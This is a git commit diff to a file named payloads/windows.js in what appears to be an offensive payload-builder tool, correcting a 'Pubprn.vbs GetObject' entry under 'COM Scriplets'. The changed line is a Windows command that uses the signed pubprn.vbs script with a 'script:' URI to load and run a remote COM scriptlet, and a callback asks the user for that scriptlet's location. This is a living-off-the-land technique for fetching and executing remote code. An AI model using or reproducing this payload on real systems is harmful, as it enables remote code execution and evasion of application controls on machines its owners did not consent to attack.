f623879b036ab83e0f27b6456a91df5060eab6d2
Gabe <gabemarshall@me.com>
2017-08-09 08:08:53 -0400

    Minor fix to typo in pubprn payload

--- payloads/windows.js
+++ payloads/windows.js
@@ -241,7 +241,7 @@ Load({
 
 Load({
 	title: "Pubprn.vbs GetObject",
-	payload: 'C:\\Windows\\System32\\Printing_Admin_Scripts\\en-US\\pubprn.vbs localhost "script:<PROMPT (Full URI to scriplet)>"',
+	payload: 'cscript /b C:\\Windows\\System32\\Printing_Admin_Scripts\\en-US\\pubprn.vbs localhost "script:<PROMPT (Full URI to scriplet)>"',
 	category: "COM Scriplets",
 	callback: function(bro){
 	    question("Enter the full path to your remote COM scriplet: ")
